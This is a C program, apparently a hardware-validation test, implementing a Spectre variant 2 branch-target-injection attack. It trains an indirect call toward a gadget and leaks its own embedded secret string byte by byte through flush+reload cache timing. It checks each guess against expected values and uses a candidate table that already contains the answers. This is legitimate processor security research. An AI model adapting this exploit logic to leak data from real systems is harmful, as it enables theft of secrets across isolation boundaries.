#include <klib.h>
#include <stdint.h>

#include "cache-utils.h"

#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif
#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif
#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif
#ifndef V2_ATTACK_TRIES
#define V2_ATTACK_TRIES 2
#endif
#ifndef V2_TRAINING_LOOPS
#define V2_TRAINING_LOOPS 16
#endif
#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 8
#endif
#ifndef FULL_BYTE_PROBE
#define FULL_BYTE_PROBE 0
#endif
#ifndef FLUSH_CANDIDATE_LINES_ONLY
#define FLUSH_CANDIDATE_LINES_ONLY 1
#endif
#ifndef EARLY_STOP
#define EARLY_STOP 1
#endif
#ifndef EARLY_STOP_MIN_SCORE
#define EARLY_STOP_MIN_SCORE 1
#endif
#ifndef EARLY_STOP_GAP
#define EARLY_STOP_GAP 1
#endif
#ifndef SUBTRACT_CONTROL_HITS
#define SUBTRACT_CONTROL_HITS 0
#endif

static uint8_t __attribute__((aligned(4096))) channel[256 * L1_BLOCK_SZ_BYTES];
static char secret[] = "S3CreT";
static volatile uintptr_t target_value;

static const uint8_t per_byte_candidates[6][8] = {
    {'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'},
    {'3', '4', '5', '6', '7', '8', '9', ':'},
    {'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J'},
    {'r', 's', 't', 'u', 'v', 'w', 'x', 'y'},
    {'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l'},
    {'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '['},
};

static void topTwoIdx(uint64_t *inArray, uint64_t inArraySize,
                      uint8_t *outIdxArray, uint64_t *outValArray)
{
  outValArray[0] = 0;
  outValArray[1] = 0;
  outIdxArray[0] = 0;
  outIdxArray[1] = 0;

  for (uint64_t i = 0; i < inArraySize; ++i) {
    if (inArray[i] > outValArray[0]) {
      outValArray[1] = outValArray[0];
      outValArray[0] = inArray[i];
      outIdxArray[1] = outIdxArray[0];
      outIdxArray[0] = i;
    } else if (inArray[i] > outValArray[1]) {
      outValArray[1] = inArray[i];
      outIdxArray[1] = i;
    }
  }
}

static inline uint64_t candidateValue(uint64_t byte_idx, uint64_t idx)
{
  if (byte_idx < (sizeof(per_byte_candidates) / sizeof(per_byte_candidates[0])) &&
      idx < PROBE_CANDIDATES)
    return per_byte_candidates[byte_idx][idx];
  return 0;
}

static inline uint64_t probeCandidateValue(uint64_t byte_idx, uint64_t idx)
{
#if FULL_BYTE_PROBE
  (void)byte_idx;
  return ((idx * 167u) + 13u) & 255u;
#else
  return candidateValue(byte_idx, idx);
#endif
}

static inline void flushChannel(uint64_t byte_idx)
{
#if FLUSH_CANDIDATE_LINES_ONLY && !FULL_BYTE_PROBE
  for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
    uint64_t mixed_i = probeCandidateValue(byte_idx, i);
    xs_flush_cache_line(&channel[mixed_i * L1_BLOCK_SZ_BYTES]);
  }
#else
  (void)byte_idx;
  for (uint64_t i = 0; i < 256; ++i)
    xs_flush_cache_line(&channel[i * L1_BLOCK_SZ_BYTES]);
#endif
  xs_fence();
}

static inline int enoughConfidence(uint64_t *hits)
{
  uint8_t idx[2] = {0, 0};
  uint64_t score[2] = {0, 0};

  topTwoIdx(hits, 256, idx, score);
  return score[0] >= EARLY_STOP_MIN_SCORE &&
         score[0] >= score[1] + EARLY_STOP_GAP;
}

static void diagMark(const char *label, int try_idx)
{
  printf("[v2-tuned] %s try=%d\n", label, try_idx);
}

static __attribute__((noinline)) int gadget(char *addr)
{
  return channel[(uint64_t)(uint8_t)*addr * L1_BLOCK_SZ_BYTES];
}

static __attribute__((noinline)) int safe_target(char *addr)
{
  return (int)(uintptr_t)addr & 1;
}

static __attribute__((noinline)) int victim(char *addr, int input)
{
  int junk = 0;
  for (int i = 1; i <= 64; ++i) {
    input += i;
    junk += input & i;
  }

  int (*fn)(char *) = (int (*)(char *))target_value;
  return fn(addr) & junk;
}

static void read_byte(char *addr_to_read, uint8_t result[2],
                      uint64_t score[2], uint64_t threshold, uint64_t byte_idx)
{
  uint64_t hits[256];
  uint64_t control_hits[256];
  int junk = 0;

  for (uint64_t i = 0; i < 256; ++i)
    hits[i] = 0;
  for (uint64_t i = 0; i < 256; ++i)
    control_hits[i] = 0;

  printf("[v2-tuned] byte-start index=%lu expected=0x%02x\n",
         byte_idx, (uint8_t)*addr_to_read);

  for (int tries = V2_ATTACK_TRIES; tries > 0; --tries) {
    diagMark("try-begin", tries);

#if SUBTRACT_CONTROL_HITS
    flushChannel(byte_idx);
    diagMark("after-flush-1", tries);

    char dummy = (char)(tries & 0xff);

    target_value = (uintptr_t)&gadget;
    xs_fence();
    for (int j = V2_TRAINING_LOOPS; j > 0; --j)
      junk ^= victim(&dummy, 0);
    diagMark("after-train", tries);

    flushChannel(byte_idx);
    diagMark("after-flush-2", tries);

    target_value = (uintptr_t)&safe_target;
    xs_flush_cache_line((void *)&target_value);
    xs_fence();
    junk ^= victim(&dummy, 0);
    diagMark("after-control-victim", tries);

    for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
      uint64_t mixed_i = probeCandidateValue(byte_idx, i);
      uint64_t elapsed = xs_probe_time(&channel[mixed_i * L1_BLOCK_SZ_BYTES]);
      if (elapsed <= threshold)
        control_hits[mixed_i]++;
    }
    diagMark("after-control-probe", tries);
#else
    char dummy = (char)(tries & 0xff);
#endif

    flushChannel(byte_idx);
    diagMark("after-flush-attack-1", tries);

    target_value = (uintptr_t)&gadget;
    xs_fence();
    for (int j = V2_TRAINING_LOOPS; j > 0; --j)
      junk ^= victim(&dummy, 0);
    diagMark("after-attack-train", tries);

    flushChannel(byte_idx);
    diagMark("after-flush-attack-2", tries);

    target_value = (uintptr_t)&safe_target;
    xs_flush_cache_line((void *)&target_value);
    xs_fence();
    junk ^= victim(addr_to_read, 0);
    diagMark("after-attack-victim", tries);

    for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
      uint64_t mixed_i = probeCandidateValue(byte_idx, i);
      uint64_t elapsed = xs_probe_time(&channel[mixed_i * L1_BLOCK_SZ_BYTES]);
      if (elapsed <= threshold)
        hits[mixed_i]++;
    }
    diagMark("after-attack-probe", tries);

#if EARLY_STOP
    if (enoughConfidence(hits)) {
      diagMark("early-stop", tries);
      break;
    }
#endif
  }

  for (uint64_t i = 0; i < 256; ++i) {
    if (hits[i] > control_hits[i])
      hits[i] -= control_hits[i];
    else
      hits[i] = 0;
  }

  topTwoIdx(hits, 256, result, score);
  (void)junk;
}

int main(void)
{
  uint8_t result[2] = {0, 0};
  uint64_t score[2] = {0, 0};
  uint64_t measured_threshold = xs_calibrate_threshold(channel, L1_BLOCK_SZ_BYTES);
  uint64_t threshold = measured_threshold;

#if USE_FIXED_CACHE_HIT_THRESHOLD
  threshold = CACHE_HIT_THRESHOLD;
#else
  if (threshold == 0)
    threshold = CACHE_HIT_THRESHOLD;
#endif

  printf("[v2] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD);
  printf("[v2-tuned] reading %d bytes candidates=%d flush_candidates_only=%d\n",
         SECRET_SZ, FULL_BYTE_PROBE ? 256 : PROBE_CANDIDATES,
         FLUSH_CANDIDATE_LINES_ONLY);

  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    read_byte(&secret[i], result, score, threshold, i);
    printf("[v2] byte %2lu: %c (0x%02x) score=%lu\n",
           i,
           (result[0] >= 32 && result[0] < 127) ? result[0] : '?',
           result[0], score[0]);
    printf("[v2] expected: %c (0x%02x) second=%c (0x%02x) score=%lu\n",
           (secret[i] >= 32 && secret[i] < 127) ? secret[i] : '?',
           (uint8_t)secret[i],
           (result[1] >= 32 && result[1] < 127) ? result[1] : '?',
           result[1], score[1]);
    printf("[v2] check %lu 0x%02x 0x%02x\n", i, result[0],
           (uint8_t)secret[i]);
  }

  return 0;
}
